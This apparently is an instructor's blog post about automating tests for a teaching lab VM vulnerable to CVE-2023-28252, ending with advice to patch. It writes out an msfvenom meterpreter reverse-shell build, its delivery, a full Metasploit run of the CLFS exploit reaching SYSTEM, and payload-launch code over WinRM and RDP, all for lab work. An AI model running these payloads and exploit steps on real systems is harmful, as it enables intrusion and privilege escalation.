---
title: "Automating the Testing of CVE-2023-28252"
permalink: /blog/2024-05-10-automating-testing-cve-2023_28252
collection: blog
publishDate: 2024-05-10
sitemap: true
---

In the Lancaster MSc Cyber Security course, I teach our module on penetration testing. For our labs and assessments this involves developing a number of vulnerable virtual machines that students have access to in a restricted environment. To give confidence that the vulnerabilities can be exploited by students in the labs, lots of time has been devoted to develop tests for these vulnerable machines and the automation of these tests. During the testing of a lab machine involving [CVE-2023-28252](https://nvd.nist.gov/vuln/detail/CVE-2023-28252) which will target a Windows 2022 server, there were challenges getting the automated test to pass while manual testing was able to exploit the vulnerability successfully.

<!-- readmore -->

## Building the Payload

The payload was built with [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) and deployed via an HTTP server.

<div class="highlighter-rouge">
<div class="highlight">
<!--StartFragment --><DIV STYLE="white-space:pre;background-color:#0C0C0C;padding:4px;overflow-y:scroll;overflow-y:auto;"><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">┌──(</SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">kali㉿kali</SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">)-[</SPAN><SPAN STYLE="color:#F2F2F2;background-color:#0C0C0C;">~</SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">]<BR>└─</SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">$</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> </SPAN><SPAN STYLE="color:#3A96DD;background-color:#0C0C0C;">msfvenom</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> </SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">--payload</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.216 LPORT=4444 </SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">--arch</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> x64 </SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">--platform</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> windows </SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">--format</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> exe </SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">--out</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> reverse_tcp.exe<BR>No encoder specified, outputting raw payload<BR>Payload size: 510 bytes<BR>Final size of exe file: 7168 bytes<BR>Saved as: reverse_tcp.exe<BR><BR></SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">┌──(</SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">kali㉿kali</SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">)-[</SPAN><SPAN STYLE="color:#F2F2F2;background-color:#0C0C0C;">~</SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">]<BR>└─</SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">$</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> </SPAN><SPAN STYLE="color:#3A96DD;background-color:#0C0C0C;">python3</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> </SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">-m</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> http.server 80<BR>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<BR>192.168.1.173 - - [10/May/2024 14:22:29] "GET / HTTP/1.1" 200 -<BR>192.168.1.173 - - [10/May/2024 14:22:29] code 404, message File not found<BR>192.168.1.173 - - [10/May/2024 14:22:29] "GET /favicon.ico HTTP/1.1" 404 -<BR>192.168.1.173 - - [10/May/2024 14:22:33] "GET /reverse_tcp.exe HTTP/1.1" 200 -</SPAN></DIV><!--EndFragment -->
</div>
</div>

## Expected Outcome

The expected output would look like this:

<div class="highlighter-rouge">
<div class="highlight">
<!--StartFragment --><DIV STYLE="white-space:pre;background-color:#0C0C0C;padding:4px;overflow-y:scroll;overflow-y:auto;"><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">┌──(</SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">kali㉿kali</SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">)-[</SPAN><SPAN STYLE="color:#F2F2F2;background-color:#0C0C0C;">~</SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">]<BR>└─</SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">$</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> </SPAN><SPAN STYLE="color:#3A96DD;background-color:#0C0C0C;">msfconsole<BR></SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">Metasploit tip: Metasploit can be configured at startup, see msfconsole<BR>--help to learn more<BR><BR><BR></SPAN><SPAN STYLE="color:#F2F2F2;background-color:#0C0C0C;">         .                                         .<BR> .<BR><BR>      </SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  </SPAN><SPAN STYLE="color:#F2F2F2;background-color:#0C0C0C;">.                       o<BR>       </SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">'   dB'                     BBP<BR>    dB'dB'dB' dBBP     dBP     dBP BB<BR>   dB'dB'dB' dBP      dBP     dBP  BB<BR>  dB'dB'dB' dBBBBP   dBP     dBBBBBBB<BR><BR></SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">                                   </SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">dBBBBBP  </SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">dBBBBBb  dBP    dBBBBP dBP dBBBBBBP<BR></SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">          </SPAN><SPAN STYLE="color:#F2F2F2;background-color:#0C0C0C;">.                  </SPAN><SPAN STYLE="color:#61D6D6;background-color:#0C0C0C;">.                  </SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">dB' dBP    dB'.BP<BR></SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">                             </SPAN><SPAN STYLE="color:#61D6D6;background-color:#0C0C0C;">|       </SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">dBP    </SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">dBBBB' dBP    dB'.BP dBP    dBP<BR></SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">                           </SPAN><SPAN STYLE="color:#61D6D6;background-color:#0C0C0C;">--o--    </SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">dBP    </SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">dBP    dBP    dB'.BP dBP    dBP<BR></SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">                             </SPAN><SPAN STYLE="color:#61D6D6;background-color:#0C0C0C;">|     </SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">dBBBBP </SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">dBP    dBBBBP dBBBBP dBP    dBP<BR><BR></SPAN><SPAN STYLE="color:#F2F2F2;background-color:#0C0C0C;">                                                                    .<BR>                .<BR>        o</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">                  </SPAN><SPAN STYLE="color:#16C60C;background-color:#0C0C0C;">To boldly go where no<BR>                            shell has gone before<BR><BR><BR></SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">       =[ </SPAN><SPAN STYLE="color:#C19C00;background-color:#0C0C0C;">metasploit v6.3.55-dev                          </SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">]<BR>+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]<BR>+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]<BR>+ -- --=[ 9 evasion                                       ]<BR><BR>Metasploit Documentation: https://docs.metasploit.com/<BR><BR>msf6 &gt; use exploit/multi/handler<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Using configured payload generic/shell_reverse_tcp<BR>msf6 exploit(</SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">multi/handler</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp<BR>PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp<BR>msf6 exploit(</SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">multi/handler</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">) &gt; set LHOST 192.168.1.216<BR>LHOST =&gt; 192.168.1.216<BR>msf6 exploit(</SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">multi/handler</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">) &gt; set LPORT 4444<BR>LPORT =&gt; 4444<BR>msf6 exploit(</SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">multi/handler</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">) &gt; run<BR><BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Started reverse TCP handler on 192.168.1.216:4444<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Sending stage (201798 bytes) to 192.168.1.173<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Meterpreter session 1 opened (192.168.1.216:4444 -&gt; 192.168.1.173:51892) at 2024-05-10 14:28:19 +0100<BR><BR>meterpreter &gt; background<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Backgrounding session 1...<BR>msf6 exploit(</SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">multi/handler</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">) &gt; use windows/local/cve_2023_28252_clfs_driver<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp<BR>msf6 exploit(</SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">windows/local/cve_2023_28252_clfs_driver</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">) &gt; set SESSION 1<BR>SESSION =&gt; 1<BR>msf6 exploit(</SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">windows/local/cve_2023_28252_clfs_driver</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp<BR>PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp<BR>msf6 exploit(</SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">windows/local/cve_2023_28252_clfs_driver</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">) &gt; set LHOST 192.168.1.216<BR>LHOST =&gt; 192.168.1.216<BR>msf6 exploit(</SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">windows/local/cve_2023_28252_clfs_driver</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">) &gt; set LPORT 5555<BR>LPORT =&gt; 5555<BR>msf6 exploit(</SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">windows/local/cve_2023_28252_clfs_driver</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">) &gt; run verbose=true<BR><BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Started reverse TCP handler on 192.168.1.216:5555<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Running automatic check ("set AutoCheck false" to disable)<BR></SPAN><SPAN STYLE="color:#16C60C;background-color:#0C0C0C;">[+]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Launching msiexec to host the DLL...<BR></SPAN><SPAN STYLE="color:#16C60C;background-color:#0C0C0C;">[+]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Process 3728 launched.<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Reflectively injecting the DLL into 3728...<BR></SPAN><SPAN STYLE="color:#16C60C;background-color:#0C0C0C;">[+]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Exploit finished, wait for (hopefully privileged) payload execution to complete.<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Sending stage (201798 bytes) to 192.168.1.173<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Meterpreter session 2 opened (192.168.1.216:5555 -&gt; 192.168.1.173:51893) at 2024-05-10 14:28:50 +0100<BR><BR>meterpreter &gt; getuid<BR>Server username: NT AUTHORITY\SYSTEM</SPAN></DIV><!--EndFragment -->
</div>
</div>

## Actual Outcome

Instead, I received an output similar to the following, which indicated that the exploit failed.

<div class="highlighter-rouge">
<div class="highlight">
<!--StartFragment --><DIV STYLE="white-space:pre;background-color:#0C0C0C;padding:4px;overflow-y:scroll;overflow-y:auto;"><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Started reverse TCP handler on 192.168.1.216:5555<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Running automatic check ("set AutoCheck false" to disable)<BR></SPAN><SPAN STYLE="color:#16C60C;background-color:#0C0C0C;">[+]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Launching netsh to host the DLL...<BR></SPAN><SPAN STYLE="color:#16C60C;background-color:#0C0C0C;">[+]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Process 4896 launched.<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Reflectively injecting the DLL into 4896...<BR></SPAN><SPAN STYLE="color:#16C60C;background-color:#0C0C0C;">[+]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Exploit finished, wait for (hopefully privileged) payload execution to complete.<BR></SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">[*]</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> Exploit completed, but no session was created.<BR>msf6 exploit(</SPAN><SPAN STYLE="color:#E74856;background-color:#0C0C0C;">windows/local/cve_2023_28252_clfs_driver</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">) &gt;</SPAN></DIV><!--EndFragment -->
</div>
</div>

## Testing Framework

In my framework for building, testing and deploying vulnerable machines, I use [WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) (via [pypsrp](https://github.com/jborean93/pypsrp) to remotely access and configure Windows machines. This allows me the ability to execute PowerShell commands on the Windows machines. So in this instance, it would let me launch the `reverse_tcp.exe` payload on the Windows machine to set up a reverse shell with Metasploit.

```python
USERNAME = "..."
PASSWORD = "..."
async with WinRMSession(ipaddr, username=USERNAME, password=PASSWORD) as sess:
    await sess.run(f'Start-Process -FilePath "C:\\Users\\{USERNAME}\\Documents\\reverse_tcp.exe"')
```

However, when doing so this consistently failed, even though I could successfully test the exploit when manually executing it.

To eliminate `Start-Process` as a potential cause of the issue, I looked for alternate ways to launch `reverse_tcp.exe`. One approach that I tried was to use verbs from Explorer to run the process. I was familiar with this approach as I had used them to [implement ejecting media in Bento](https://github.com/chef/bento/pull/1529/files).  [A Microsoft devblog by Ed Wilson](https://devblogs.microsoft.com/scripting/use-powershell-to-work-with-windows-explorer/) was useful in getting the `Open` verb to work. However, this still led to the same issue.

```python
async with WinRMSession(ipaddr, username=USERNAME, password=PASSWORD) as sess:
    await sess.run(f'(New-Object -com Shell.Application).Namespace("C:\\Users\\{USERNAME}\\Documents").ParseName("reverse_tcp.exe").InvokeVerb("Open")')
```

I wanted to check that WinRM wasn't the cause of the issue, so replaced the code to execute `reverse_tcp.exe` with the following and manually ran `reverse_tcp.exe` when the test paused. This worked, meaning that the cause of my issue was related to either connecting via WinRM or how process are launched via WinRM and how this interacts with the exploit.
```python
input()
```

Unfortunately, always having a manual input here is not acceptable, as this prevents the test suite from automatically checking this exploit path.

One of the other services that the Windows 2022 server runs is RDP. [StackOverflow was useful here](https://stackoverflow.com/a/59900048) as it indicated that applications can be run over RDP with an appropriate configuration. All that was needed was to disable checking the list of allowed applications. Not a sensible idea for a secure system, but not harmful in the context of developing a vulnerable machine for students to attack.
```powershell
# Disable allowlist for using RDP to run programs
# See: https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-publishing-wmiprovider-fdisabledallowlist
Set-ItemProperty `
    -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\TSAppAllowList" `
    -Name "fDisabledAllowList" `
    -Value 1
```

A final challenge is that RDP was not happy that it was being run remotely over an SSH terminal.

<div class="highlighter-rouge">
<div class="highlight">
<!--StartFragment --><DIV STYLE="white-space:pre;background-color:#0C0C0C;padding:4px;overflow-y:scroll;overflow-y:auto;"><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">┌──(</SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">kali㉿kali</SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">)-[</SPAN><SPAN STYLE="color:#F2F2F2;background-color:#0C0C0C;">~</SPAN><SPAN STYLE="color:#13A10E;background-color:#0C0C0C;">]<BR>└─</SPAN><SPAN STYLE="color:#3B78FF;background-color:#0C0C0C;">$</SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;"> </SPAN><SPAN STYLE="color:#3A96DD;background-color:#0C0C0C;">xfreerdp </SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">/u:User /p:Password /v:192.168.1.87 /app:</SPAN><SPAN STYLE="color:#C19C00;background-color:#0C0C0C;">'C:\\Users\\User\\Documents\\reverse_tcp.exe'<BR></SPAN><SPAN STYLE="color:#CCCCCC;background-color:#0C0C0C;">[14:47:13:654] [1692:1692] [ERROR][com.freerdp.client.x11] - failed to open display:<BR>[14:47:13:654] [1692:1692] [ERROR][com.freerdp.client.x11] - Please check that the $DISPLAY environment variable is properly set.</SPAN></DIV><!--EndFragment -->
</div>
</div>

So instead of running `xfreerdp` via the terminal directly, the code first [creates a virtual framebuffer with xvfb-run](https://www.chrisrcook.com/2022/03/27/headless-rdp-for-fun-and-profit/). This allows the `reverse_tcp.exe` to be executed and in such a way that allows the exploit to be successful.

```python
rdp_command = f"xvfb-run -a xfreerdp /u:{USERNAME} /p:{PASSWORD} /v:{ipaddr} /app:'C:\\Users\\{USERNAME}\\Documents\\reverse_tcp.exe'"
rdp_proc = await conn.create_process(rdp_command, stderr=asyncssh.STDOUT, encoding="utf-8")
```

## Conclusions

It is still unclear to me why using a WinRM-based approach to launch `reverse_tcp.exe` did not work, especially as in other test cases for different vulnerabilities it has worked successfully. It would be interesting to investigate exactly why launching via WinRM prevented the exploit from being successful. However, the RDP approach does work and tests a slightly more realistic approach, as the students would likely use RDP to launch `reverse_tcp.exe` via a graphical interface.

Please note that this [vulnerability was patched](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28252) on the 11th of April 2023 with Windows Server 2022 10.0.20348.1668, such systems still running a vulnerable version should be updated immediately.
